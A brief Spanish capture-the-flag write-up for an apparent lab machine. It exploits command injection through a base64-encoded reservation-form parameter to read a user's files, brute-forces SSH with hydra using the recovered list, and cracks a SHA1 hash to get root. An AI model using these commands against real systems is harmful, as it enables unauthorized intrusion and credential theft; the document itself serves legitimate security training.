## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay una pagina para un restaurante, lo único que interesa es una sección donde haremos una reserva. Lleno los datos e intercepto la petición.

Interesa un parámetro llamado “userInput”, donde al ejecutar comandos encodeados en base64 los ejecuta, así que pruebo una rev shell pero no consigo nada, toca encontrar posibles credenciales dentro del servidor. Pruebo listando los archivos de usuario:

```bash
echo -n "find / -type f -user cachopin 2>/dev/null" | base64
# Info:
`ZmluZCAvIC10eXBlIGYgLXVzZXIgY2FjaG9waW4gMj4vZGV2L251bGw=`
```

Interesa el archivo “client_list.txt”, así que uso el comando cat para leerlo:

```bash
echo -n "cat /home/cachopin/newsletters/client_list.txt" | base64
# Info:
`Y2F0IC9ob21lL2NhY2hvcGluL25ld3NsZXR0ZXJzL2NsaWVudF9saXN0LnR4dA==`
```

Dentro hay una lista de posibles usuarios, los cuales pruebo como contraseñas ya que se que cachopin es el único usuario:

```bash
hydra -l cachopin -P client_list.txt ssh://172.17.0.2 -t 64
```

Pass : simple

## Escalada:

Anteriormente encontramos un listado de `hashes` los cuales vemos que esta en `SHA1` por lo que vamos a intentar decodificarlo con un script de un repositorio de `GitHub:`

https://github.com/PatxaSec/SHA_Decrypt/blob/main/sha2text.py

Y desde el host probamos uno por uno:

```bash
python3 decoder.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/wordlists/rockyou.txt'
# Info:
[+] Pwnd !!! $SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=::::cecina
```

Encontrando así la contraseña de root.

Listo.
